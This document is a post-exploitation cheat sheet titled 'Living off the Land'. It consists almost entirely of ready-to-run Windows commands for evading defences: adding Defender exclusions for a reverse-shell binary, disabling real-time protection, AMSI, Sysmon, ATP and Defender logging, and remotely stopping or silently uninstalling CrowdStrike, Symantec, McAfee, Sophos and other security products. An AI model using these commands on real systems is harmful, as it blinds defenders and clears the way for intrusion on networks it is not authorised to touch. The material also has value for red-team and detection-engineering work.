# Living off the Land

## 01 - Basic Commands

### 1.1 - Add Exclusions

- Note: You must run this as administrator add any exclusions

```
PS C:\> Add-MpPreference -ExclusionPath C:\Windows\Temp

PS C:\> Add-MpPreference -ExclusionProcess powershell.exe

PS C:\> Add-MpPreference -ExclusionExtension ".exe"

PS C:\> Add-MpPreference -ExclusionExtension ".bat"

PS C:\> Add-MpPreference -ExclusionPath C:\Windows\Temp\reverseshell.exe
```

### 1.2 - Windows Defender

#### 1.2.1 - Disable

##### 1.2.1.1 - Command Prompt

`C:\> net stop "Security Center"`

- Note: Just the rest of these are not tested just yet

```
C:\> net stop "WdNisSvc"

C:\> net stop "WdNisDrv"

C:\> net stop "WdFilter"

C:\> net stop "WdBoot"

C:\> net stop "wcncsvc"
```

##### 1.2.1.2 - Powershell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true

Set-MpPreference -DisableBehaviorMonitoring $true

Set-MpPreference -DisableIntrusionPreventionSystem $true

Set-MpPreference -SubmitSamplesConsent 2

Set-MpPreference -PUAProtection Disable

Set-MpPreference -DisablePrivacyMode $true

Set-MpPreference -MAPSReporting 0

Set-MpPreference -HighThreatDefaultAction 6 -Force

Set-MpPreference -ModerateThreatDefaultAction 6

Set-MpPreference -LowThreatDefaultAction 6

Set-MpPreference -SevereThreatDefaultAction 6

Set-MpPreference -DisableIOAVProtection $true

Set-MpPreference -DisableScriptScanning $true

Set-MpPreference -DisableArchiveScanning $true

Set-MpPreference -DisableCatchupFullScan $true

Set-MpPreference -DisableCatchupQuickScan $true

Set-MpPreference -DisableEmailScanning $true

Set-MpPreference -DisableRemoveableDriveScanning $true

Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true

Set-MpPreference -DisableScanningNetworkFiles $true

Set-MpPreference -DisableBlockAtFirstSeen $true

Set-MpPreference -EnableControlledFolderAccess Disabled

Set-MpPreference -ScanScheduleDay 8
```

#### 1.2.2 - Remove Definitions

##### 1.2.2.1 - Command Prompt

```
C:\> "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all

C:\> winrs -remote:<IP> "\"C:\Program Files\Windows Defender\MpCmdRun.exe\" -removedefinitions -all"
```

##### 1.2.2.2 - Powershell

`PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all }`

#### 1.2.3 - Uninstall

##### 1.2.3.1 - Powershell

`PS C:\> Uninstall-WindowsFeature -Name Windows-Defender`

### 1.1.3 - Disable Advanced Threat Protection

#### 1.1.3.1 - Disable Endpoint

##### 1.1.3.1.1 - Command Prompt

```
C:\> sc config TrustedInstaller binpath="cmd /c sc stop diagtrack & sc config diagtrack binpath='useless value'" && sc start TrustedInstaller

C:\> whoami /groups | findstr Trusted

C:\> rename "C:\Program Files\Windows Defender Advanced Threat Protection\SenseCncProxy.exe" SenseCncProxi.exe
```

##### 1.1.3.1.2 - Powershell

```powershell
PS C:\> Set-NtTokenPrivilege SeDebugPrivilege
Start-Service TrustedInstaller
$process = Get-NtProcess -Name TrustedInstaller.exe
$token = $process.OpenToken()
$token.Groups | Where-Object ($_.$id.Name -match "TrustedInstaller")
$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $process
```

#### 1.1.3.2 - Remove PPL Protection

Be sure to make modification in `mimidrv.c` and re-sign it

```
mimikatz # !+

mimikatz # !processprotect /process:MsSense.exe /remove
```

```
C:\> taskkill /f /im MsSense.exe /t

C:\> sc qprotection sense

C:\> sc query sense
```

### 1.1.4 - Sysinternals

#### 1.1.4.1 - Sysmon

##### 1.1.4.1.1 - Disable

- Get driver for Sysmon and disable it

```
C:\> fltmc

C:\> fltmc unload SysmonDrv
```

- Disable Sysmon service

`C:\> sc stop Sysmon64`

- Change configuration for sysmon to make it useless or reduce the ruleset to evade detection

`C:\> Sysmon64.exe -c sysmonconfig-export.xml`

- Change to default settings

`C:\> Sysmon64.exe -c --`

##### 1.1.4.1.2 - Uninstall

- Note: You must have administrative privileges

`C:\> sysmon64.exe -u`

### 1.1.5 - Disable Powershell

#### 1.1.5.1 - Powershell

```
PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

PS C:\> icm -computername <IP> -scriptblock {Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force}
```

### 1.1.6 - Disable Third-Party Endpoints

#### 1.6.1 - Endpoints

##### 1.1.6.1.1 - CrowdStrike

- Command Prompt

`C:\> net stop "CrowdStrike Falcon Sensor Service"`

- Powershell

```
PS C:\> Get-Service -ComputerName <IP> -Name "CrowdStrike Falcon Sensor Service" | Stop-Service -Force

PS C:\> Stop-Service -InputObject $(Get-Service -ComputerName <IP> -Name "CrowdStrike Falcon Sensor Service")

PS C:\> icm -computername <IP> -scriptblock {cmd /c "net stop \"CrowdStrike Falcon Sensor Service\""}
```

##### 1.1.6.1.2 - Symantec

- Command Prompt

```
C:\> net stop "Symantec Endpoint Protection"

C:\> sc \\<IP> stop "Symantec Endpoint Protection"
```

- Powershell

```
PS C:\> Get-Service -ComputerName <IP> -Name "Symantec Endpoint Protection" | Stop-Service -Force

PS C:\> Stop-Service -InputObject $(Get-Service -ComputerName <IP> -Name "Symantec Endpoint Protection")

PS C:\> icm -computername <IP> -scriptblock {cmd /c "net stop \"Symantec Endpoint Protection\""}
```

##### 1.1.6.1.3 - Zabbix

- Command Prompt

```
C:\> net stop "Zabbix Agent"

C:\> sc \\<IP> stop "Zabbix Agent"
```

- Powershell

```
PS C:\> Get-Service -ComputerName <IP> -Name "Zabbix Agent" | Stop-Service -Force

PS C:\> Stop-Service -InputObject $(Get-Service -ComputerName <IP> -Name "Zabbix Agent")

PS C:\> icm -computername <IP> -scriptblock {cmd /c "net stop \"Zabbix Agent\""}
```

### 1.1.7 - Uninstall Third-Party Endpoints

#### 1.1.7.1 - MalwareBytes

##### 1.1.7.1.1 - Command Prompt

`C:\> cmd.exe /c "C:\Program Files\Malwarebytes\Anti-Malware\unins001.exe" /silent /noreboot`

## 1.2 - WMIC

### 1.2.1 - Add Exclusions

#### 1.2.1.1 - Command Prompt

- Adding Windows Defender path exclusions with WMIC

```
C:\> wmic /namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"

C:\> wmic /namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"\Temp\\"

C:\> wmic /namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\".dll\"

C:\> wmic /namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"rundll32.exe\"
```

### 1.2.2 - Disable Windows Defender

#### 1.2.2.1 - Powershell

```
PS C:\> get-wmiobject -namespace root\microsoft\protectionmanagement -class msft_mpcomputerstatus

PS C:\> get-ciminstance -namespace root\microsoft\protectionmanagement -class msft_mpcomputerstatus
```

### 1.2.3 - Uninstall Endpoints

#### 1.2.3.1 - Syntax

##### 1.2.3.1.1 - Command Prompt

`C:\> wmic product get name /value`

- Note: Some AVs particular anti-malware that is installed in windows taken measures to prevent attackers to uninstall it. But not all of them. When uninstalling the software you must have **administrative privileges**.

`C:\> wmic product where name="<SOFTWARE NAME>" call uninstall /nointeractive`

##### 1.2.3.1.2 - Powershell

TODO: `WMIC` and `Get-WmiObject` (`gwmi`) is deprecated so rewrite it to

```
Get-CimAssociatedInstance
Get-CimInstance
Get-CimClass
Get-CimSession
Invoke-CimMethod
New-CimInstance
New-CimsSession
New-CimSessionOption
Register-CimIndicationEvent
Remove-CimInstance
Remove-CimInstance
Remove-CimSession
Set-CimInstance
```

#### 1.2.3.2 - Windows Defender

##### 1.2.3.2.1 - Command Prompt

`C:\> wmic product where name="Microsoft Security Client" call uninstall /nointeractive`

#### 1.2.3.3 - ESET

##### 1.2.3.3.1 - Command Prompt

`C:\> wmic product where name="ESET File Security" call uninstall /nointeractive`

#### 1.2.3.4 - McAfee

##### 1.2.3.4.1 - Command Prompt

```
C:\> wmic product where name="McAfee VirusScan Enterprise" call uninstall /nointeractive

C:\> wmic product where name="McAfee Agent" call uninstall /nointeractive

C:\> wmic product where name="McAfee DLP Endpoint" call uninstall /nointeractive

C:\> wmic product where name="McAfee Endpoint Security Platform" call uninstall /nointeractive

C:\> wmic product where name="McAfee Endpoint Security Threat Prevention" call uninstall /nointeractive

C:\> wmic product where name="McAfee SiteAdvisor Enterprise" call uninstall /nointeractive
```

#### 1.2.3.5 - MalwareBytes

##### 1.2.3.5.1 - Command Prompt

`C:\> wmic product where name="Malwarebytes Managed Client" call uninstall /nointeractive`

#### 1.2.3.6 - AVG

##### 1.2.3.6.1 - Command Prompt

`C:\> wmic product where name="AVG 2015" call uninstall /nointeractive`

#### 1.2.3.7 - Webroot

##### 1.2.3.7.1 - Command Prompt

`C:\> wmic product where name="Webroot SecureAnywhere" call uninstall /nointeractive`

#### 1.2.3.8 - Symantec

##### 1.2.3.8.1 - Command Prompt

```
C:\> wmic product where name="Symantec Endpoint Protection" call uninstall /nointeractive

C:\> wmic product where name="Symantec Backup Exec Remote Agent for Windows" call uninstall /nointeractive
```

#### 1.2.3.9 - Sophos

##### 1.2.3.9.1 - Command Prompt

`C:\> wmic product where name="Sophos System Protection" call uninstall /nointeractive`

`C:\> wmic product where name="Sophos AutoUpdate" call uninstall /nointeractive`

`C:\> wmic product where name="Sophos Remote Management System" call uninstall /nointeractive`

## 1.3 - Registry

^9b4be2

### 1.3.1 - Disable Windows Defender

#### 1.3.1.1 - Disable Real Time Protection

##### 1.3.1.1.1 - Command Prompt

```
C:\> reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f

C:\> reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f
```

##### 1.3.1.1.2 - Powershell

```powershell
PS C:\> Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "AllowFastServiceStartup" -Type DWord -Value 0

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Type DWord -Value 0

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Type DWord -Value 1

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Real-Time Protection"

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Type DWord -Value 1

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Type DWord -Value 1

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Type DWord -Value 1

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Type DWord -Value 1

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Type DWord -Value 1

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "Spynet"

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Type DWord -Value 1

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "LocalSettingOverrideSpynetReporting" -Type DWord -Value 0

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Type DWord -Value 2

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Type DWord -Value 2

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Type DWord -Value 4

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "MpEngine"

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpCloudBlockLevel" -Type DWord -Value 2

gpupdate.exe /force
```

##### 1.3.1.1.3 - Regshell

TODO: Complete this

```
$ regshell -U <DOMAIN>/<username>%<password> -R <IP>

> predef HKEY_LOCAL_MACHINE
> cd HKEY_LOCAL_MACHINE\Policies\Microsoft
```

#### 1.3.1.2 - Disable Windows Defender Services

##### 1.3.1.2.1 - Command Prompt

- Note: Run this again because Windows Defender is very persistent

```
C:\> reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f

C:\> reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f

C:\> reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f

C:\> reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f

C:\> reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f

C:\> reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```

##### 1.3.1.2.2 - Powershell

TODO: Complete this

##### 1.3.1.2.3 - Regshell

TODO: Complete this

```
$ regshell -U <DOMAIN>/<username>%<password> -R <IP>

> predef HKEY_LOCAL_MACHINE
> cd Policies\Microsoft
```

#### 1.3.1.3 - Disable Logging

##### 1.3.1.3.1 - Command Prompt

```
C:\> reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

C:\> reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
```

##### 1.3.1.3.2 - Regshell

TODO: Complete this

```
$ regshell -U <DOMAIN>/<username>%<password> -R <IP>

> predef HKEY_LOCAL_MACHINE
> cd Policies\Microsoft
```

#### 1.3.1.4 - Disable Systray Icon

##### 1.3.1.4.1 - Command Prompt

```
C:\> reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "Windows Defender" /f

C:\> reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f

C:\> reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
```

##### 1.3.1.4.2 - Regshell

TODO: Complete this

```
$ regshell -U <DOMAIN>/<username>%<password> -R <IP>

> predef HKEY_LOCAL_MACHINE
> cd Policies\Microsoft
```

### 1.3.2 - Disable Windows Defender Security Center

#### 1.3.2.1 - Command Prompt

`C:\> reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f`

#### 1.3.2.2 - Regshell

TODO: Complete this

```
$ regshell -U <DOMAIN>/<username>%<password> -R <IP>

> predef HKEY_LOCAL_MACHINE
> cd Policies\Microsoft
```

### 1.3.3 - Remove Windows Defender Context Menu

#### 1.3.3.1 - Command Prompt

```
C:\> reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f

C:\> reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f

C:\> reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
```

#### 1.3.3.2 - Regshell

TODO: Complete this

```
$ regshell -U <DOMAIN>/<username>%<password> -R <IP>

> predef HKEY_LOCAL_MACHINE
> cd Policies\Microsoft
```

## 1.4 - Schtasks

```
C:\> schtasks /change /tn "Microsoft\Windows\ExploitGuard\ExploitGuard MDM Policy Refresh" /disable

C:\> schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /disable

C:\> schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /disable

C:\> schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /disable

C:\> schtasks /change /tn "Microsoft\Windows\Windows Defender\Windows Defender Verification" /disable
```

## 1.5 - Msiexec

### 1.5.1 - Uninstall Endpoint

- Command Prompt

```
C:\> wmic [/node:<IP>] product get name,identifyingnumber

C:\> wmic [/node:<IP>] /namespace:\\root\securitycenter2 path antivirusproduct

C:\> wmic [/node:<IP>] /namespace:\\root\securitycenter2 path antivirusproduct get * /format:list

C:\> wmic [/node:<IP>] /namespace:\\root\securitycenter2 path antivirusproduct get displayname

C:\> msiexec /q /qn /norestart /uninstall {<GUID>}
```

- Powershell

```
PS C:\> Get-WMIObject -ClassName Win32_Product | Select-Object -Property IdentifyingNumber, Name

PS C:\> Get-CimInstance -ClassName Win32_Product | Select-Object -Property IdentifyingNumber, Name

PS C:\> msiexec /q /qn /norestart /uninstall {<GUID>}
```

## 1.6 - Impacket

TODO: Translate the registry commands to impacket from above -> [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/03 - Defense Evasion/02 - Security Solutions/Windows/01 - Manual/Living off the Land#^9b4be2|Registry]] 

### 1.6.1 - Disable Windows Defender

#### 1.6.1.1 - Disable Real Time Protection

`$ reg`

#### 1.6.1.2 - Disable Windows Defender Services

`$ reg`

#### 1.6.1.3 - Disable Logging

`$ reg`

#### 1.6.1.4 - Disable Systray Icon

`$ reg`

### 1.6.2 - Disable Windows Defender Security Center

`$ reg`

### 1.6.3 - Remove Windows Defender Context Menu

`$ reg`

---
## References

- [Sysmon Modular](https://github.com/olafhartong/sysmon-modular)

- [Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)

- [Unloading Sysmon Driver](https://www.ired.team/offensive-security/defense-evasion/unloading-sysmon-driver)

- [Level-up your host-based monitoring with Sysmon Youtube Video](https://www.youtube.com/watch?v=gZpp4w3inzc)